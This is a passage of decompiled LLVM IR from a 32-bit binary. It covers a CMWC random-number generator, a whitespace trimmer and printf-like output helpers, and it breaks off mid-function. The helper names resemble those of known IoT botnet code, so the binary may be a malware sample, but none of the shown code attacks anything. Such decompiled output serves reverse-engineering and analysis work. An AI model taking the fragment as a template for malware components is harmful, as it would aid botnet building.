  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_265e8.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_265ec.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_265f0.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_265e8.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_265e8.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_265e8.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_26248.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_26248.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_265e8.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_26244.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_26244.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_265e8.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_265e8.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_265e8.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp41 = icmp slt i32 %arg3, 1
  br i1 %tmp41, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e018 = load i8, i8* %arg2, align 1
  %v2_85e420 = icmp eq i8 %v2_85e018, 0
  br i1 %v2_85e420, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc22 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.021 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.021, 1
  %v1_85d4 = add i32 %v4_85dc22, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge2 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_8618 ], [ %storemerge2, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867015 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867015, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.116 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.116, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.116, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e826 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a88 = load i8, i8* %arg2, align 1
  %v2_86ac10 = icmp eq i8 %v2_86a88, 0
  br i1 %v2_86ac10, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a412 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.011 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.011, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a412, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e825 = phi i32 [ %v3_86e826, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e45 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e45, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.36 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.36, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.36, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e825, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v2_87f0 = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v1_87f4 = add i32 %v2_87f0, %v2_87d0
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v1_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  store i32 35052, i32* %stack_var_-4, align 4
  %v2_88e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_88e8, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8c9429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8c9831 = icmp eq i8 %v2_8c9429, 0
  br i1 %v2_8c9831, label %dec_label_pc_8ca0, label %dec_label_pc_8908.lr.ph

dec_label_pc_8908.lr.ph:                          ; preds = %entry
  %v5_8c4c = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_8908.lr.ph, %dec_label_pc_8c84
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8908.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8c84 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
